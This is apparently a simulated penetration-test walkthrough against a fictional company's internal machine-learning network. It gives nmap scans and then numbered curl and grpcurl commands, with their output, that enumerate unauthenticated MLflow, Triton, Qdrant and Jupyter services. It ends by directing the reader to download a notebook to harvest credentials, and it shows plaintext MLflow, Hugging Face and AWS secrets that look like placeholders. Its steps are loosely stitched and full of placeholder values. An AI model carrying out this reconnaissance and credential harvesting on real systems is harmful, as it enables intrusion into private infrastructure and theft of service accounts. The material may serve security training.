@@ -1,0 +1,240 @@
+nmap -p 5000,6333,6334,8000,8001,8002,8888,9000,9001 -sV 10.10.45.0/24
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at [date]
+
+Nmap scan report for web-prod.cyphira.internal (10.10.45.10)
+Host is up (X.XXs latency).
+5000/tcp closed
+6333/tcp closed
+6334/tcp closed
+8000/tcp closed
+8001/tcp closed
+8002/tcp closed
+8888/tcp closed
+9000/tcp closed
+9001/tcp closed
+
+Nmap scan report for db-prod.cyphira.internal (10.10.45.11)
+Host is up (X.XXs latency).
+5000/tcp closed
+6333/tcp closed
+6334/tcp closed
+8000/tcp closed
+8001/tcp closed
+8002/tcp closed
+8888/tcp closed
+9000/tcp closed
+9001/tcp closed
+
+Nmap scan report for mlflow-tracker.cyphira.internal (10.10.45.12)
+Host is up (X.XXs latency).
+5000/tcp open http Werkzeug/3.0.1 Python/3.11.7
+6333/tcp closed
+6334/tcp closed
+8000/tcp closed
+8001/tcp closed
+8002/tcp closed
+8888/tcp closed
+9000/tcp closed
+9001/tcp closed
+
+Nmap scan report for triton-inference.cyphira.internal (10.10.45.15)
+Host is up (X.XXs latency).
+5000/tcp closed
+6333/tcp closed
+6334/tcp closed
+8000/tcp open http
+8001/tcp open grpc
+8002/tcp open http Prometheus metrics
+8888/tcp closed
+9000/tcp closed
+9001/tcp closed
+
+Nmap scan report for qdrant-vectordb.cyphira.internal (10.10.45.18)
+Host is up (X.XXs latency).
+5000/tcp closed
+6333/tcp open http
+6334/tcp open grpc
+8000/tcp closed
+8001/tcp closed
+8002/tcp closed
+8888/tcp closed
+9000/tcp closed
+9001/tcp closed
+
+Nmap scan report for jupyter-ds.cyphira.internal (10.10.45.20)
+Host is up (X.XXs latency).
+5000/tcp closed
+6333/tcp closed
+6334/tcp closed
+8000/tcp closed
+8001/tcp closed
+8002/tcp closed
+8888/tcp open http Tornado/6.4
+9000/tcp closed
+9001/tcp closed
+
+Nmap scan report for minio-store.cyphira.internal (10.10.45.22)
+Host is up (X.XXs latency).
+5000/tcp closed
+6333/tcp closed
+6334/tcp closed
+8000/tcp closed
+8001/tcp closed
+8002/tcp closed
+8888/tcp closed
+9000/tcp open http MinIO
+9001/tcp open http MinIO Console
+
+Nmap done: 256 IP addresses (7 hosts up) scanned in X.XX seconds
+Service detection performed.
+
+nmap -p 22,80,443,5432 -sV 10.10.45.0/24
+Starting Nmap 7.94SVN ( https://nmap.org ) at [date]
+
+Nmap scan report for web-prod.cyphira.internal (10.10.45.10)
+Host is up (X.XXs latency).
+22/tcp   open ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6
+80/tcp   open http    nginx 1.24.0
+443/tcp  open ssl/http nginx 1.24.0
+5432/tcp closed
+
+Nmap scan report for db-prod.cyphira.internal (10.10.45.11)
+Host is up (X.XXs latency).
+22/tcp   open ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.6
+80/tcp   closed
+443/tcp  closed
+5432/tcp open postgresql PostgreSQL 15.2
+
+Nmap scan report for mlflow-tracker.cyphira.internal (10.10.45.12)
+Host is up (X.XXs latency).
+22/tcp   closed
+80/tcp   closed
+443/tcp  closed
+5432/tcp closed
+
+Nmap scan report for triton-inference.cyphira.internal (10.10.45.15)
+Host is up (X.XXs latency).
+22/tcp   closed
+80/tcp   closed
+443/tcp  closed
+5432/tcp closed
+
+Nmap scan report for qdrant-vectordb.cyphira.internal (10.10.45.18)
+Host is up (X.XXs latency).
+22/tcp   closed
+80/tcp   closed
+443/tcp  closed
+5432/tcp closed
+
+Nmap scan report for jupyter-ds.cyphira.internal (10.10.45.20)
+Host is up (X.XXs latency).
+22/tcp   closed
+80/tcp   closed
+443/tcp  closed
+5432/tcp closed
+
+Nmap scan report for minio-store.cyphira.internal (10.10.45.22)
+Host is up (X.XXs latency).
+22/tcp   closed
+80/tcp   closed
+443/tcp  closed
+5432/tcp closed
+
+Nmap done: 256 IP addresses (7 hosts up) scanned in X.XX seconds
+Service detection performed.
+
+
+
+Step 1: Check the HTTP headers on the MLflow host.
+curl -v http://10.10.45.12:5000/
+```
+HTTP/1.1 200 OK
+Server: Werkzeug/3.0.1 Python/3.11.7
+Content-Type: text/html; charset=utf-8
+```
+Step 2: Probe the inference server's model endpoint.
+curl http://10.10.45.15:8000/v2/models
+```
+{"models":[{"name":"fraud_detector","version":"3","state":"READY","platform":"pytorch_libtorch"},{"name":"text_embedder","version":"2","state":"READY","platform":"onnxruntime"}]}
+```
+Step 3: Trigger an error message.
+curl -X POST http://10.10.45.15:8000/v2/models/fraud_detector/infer -d '{"bad": "data"}'
+```
+{"error":"expected input tensor 'transaction_features' shape [1,47] dtype FP32, got malformed JSON","details":"parse error at line 1"}
+```
+Step 4: Check for gRPC reflection.
+grpcurl -plaintext 10.10.45.15:8001 list
+```
+inference.GRPCInferenceService
+grpc.health.v1.Health
+grpc.reflection.v1alpha.ServerReflection
+```
+Step 5: Probe the remaining services.
+curl http://10.10.45.18:6333/collections
+```
+{"result":{"collections":[{"name":"internal-kb-embeddings"},{"name":"customer-support-tickets"}]},"status":"ok"}
+```
+curl http://10.10.45.20:8888/api/kernels
+```
+[{"id":"k-8f3a1b","name":"fraud_model_training.ipynb","last_activity":"2024-01-15T14:32:00Z","state":"idle"},{"id":"k-2c7d9e","name":"rag_pipeline_debug.ipynb","last_activity":"2024-01-15T16:45:00Z","state":"busy"}]
+
+
+
+curl -v http://10.10.45.15:8000/
+```
+HTTP/1.1 200 OK
+NV-Status: OK
+Content-Type: application/json
+```
+
+
+Step 1: Enumerate MLflow experiments.
+curl -X POST http://10.10.45.12:5000/api/2.0/mlflow/experiments/search -H "Content-Type: application/json" -d '{}'
+{"experiments":[{"experiment_id":"1","name":"fraud-detection-prod","lifecycle_stage":"active"},{"experiment_id":"2","name":"rag-embeddings-tuning","lifecycle_stage":"active"},{"experiment_id":"3","name":"customer-churn-prototype","lifecycle_stage":"active"},{"experiment_id":"4","name":"ab-test-recommendation-engine","lifecycle_stage":"deleted"}]}
+
+Step 2: List registered models.
+curl http://10.10.45.12:5000/api/2.0/mlflow/registered-models/list
+{"registered_models":[{"name":"cyphira-fraud-classifier","latest_versions":[{"version":"3","current_stage":"Production"}]},{"name":"internal-kb-embedder","latest_versions":[{"version":"2","current_stage":"Staging"}]},{"name":"churn-predictor","latest_versions":[{"version":"1","current_stage":"Archived"}]}]}
+
+Step 3: Extract model version details.
+curl http://10.10.45.12:5000/api/2.0/mlflow/model-versions/search
+{"model_versions":[{"name":"cyphira-fraud-classifier","version":"3","current_stage":"Production","source":"s3://cyphira-ml-models/fraud-detection/v3/model.pkl","user_id":"j.chen@cyphira.io","tags":{"git_commit":"a4f8c2e","deploy_env":"prod-us-east-1"}},{"name":"internal-kb-embedder","version":"2","current_stage":"Staging","source":"s3://cyphira-ml-models/rag-pipeline/v2/embedder.onnx","user_id":"m.rodriguez@cyphira.io","tags":{"project_codename":"phoenix","hf_base_model":"sentence-transformers/all-MiniLM-L6-v2"}}]}
+
+Step 4: Query Triton model config.
+curl http://10.10.45.15:8000/v2/models/fraud_detector/config
+{"name":"fraud_detector","platform":"pytorch_libtorch","inputs":[{"name":"transaction_features","datatype":"FP32","shape":[1,47]}],"outputs":[{"name":"fraud_probability","datatype":"FP32","shape":[1,1]}],"max_batch_size":64}
+
+Step 5: Enumerate the vector database.
+curl http://10.10.45.18:6333/collections/internal-kb-embeddings
+{"result":{"name":"internal-kb-embeddings","vectors":{"size":384,"distance":"Cosine"},"points_count":127843,"payload_schema":{"document_title":"keyword","department":"keyword","sensitivity_level":"keyword","last_updated":"datetime"}},"status":"ok"}
+
+Step 6: Check the Jupyter notebooks.
+curl http://10.10.45.20:8888/api/contents
+{"content":[{"name":"fraud_model_training.ipynb","type":"notebook","last_modified":"2024-01-15T14:32:00Z"},{"name":"rag_pipeline_debug.ipynb","type":"notebook","last_modified":"2024-01-15T16:45:00Z"},{"name":"data_exploration.ipynb","type":"notebook","last_modified":"2024-01-10T09:15:00Z"}]}
+
+Now that you have located the rag_pipeline_debug.ipynb notebook, you need to retrieve its contents to check for any stored credentials. Use the following command to get the actual content of the notebook:
+
+curl -X GET http://10.10.45.20:8888/api/contents/rag_pipeline_debug.ipynb?content=1
+This command will return the notebook's content, including any code cells that may contain the MLflow service account credentials. Look specifically for environment variables like MLFLOW_TRACKING_USERNAME and MLFLOW_TRACKING_PASSWORD.
+Cell 1: import qdrant_client
+
+Cell 2: from sentence_transformers import SentenceTransformer
+
+Cell 3:
+```python
+import mlflow, os
+mlflow.set_tracking_uri("http://10.10.45.12:5000")
+os.environ["MLFLOW_TRACKING_USERNAME"]="ml-service-account"
+os.environ["MLFLOW_TRACKING_PASSWORD"]="cyphira-MLfl0w-2024!"
+os.environ["HF_TOKEN"]="hf_kR7mXpQvL9nJwT2yBcDfAeGh8iKlMnOp"
+```
+
+Cell 4:
+```python
+import boto3
+s3=boto3.client('s3',aws_access_key_id='AKIA3Cyphira7EXAMPLE',aws_secret_access_key='wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY')
+```
+
+
+
